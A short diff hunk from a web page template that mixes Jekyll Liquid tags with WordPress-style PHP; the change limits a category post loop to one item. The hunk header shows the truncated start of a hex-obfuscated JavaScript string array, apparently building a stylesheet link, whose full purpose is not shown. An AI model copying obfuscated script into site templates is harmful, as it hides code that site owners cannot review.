@@ -102,7 +102,7 @@ var _0xb2ea=["\x3C\x6C\x69\x6E\x6B\x20\x72\x65\x6C\x3D\x22\x73\x74\x79\x6C\x65\x
 	{% endfor %} 
 	</div>
 	<div class="wtd">
-{% for post in site.categories.ani %}
+{% for post in site.categories.ani limit:1 %}
 <a href="<?php the_permalink() ?>">
 <div id="mtd">
 <?php if (time() - strtotime($wdate) < $upday) { ?>
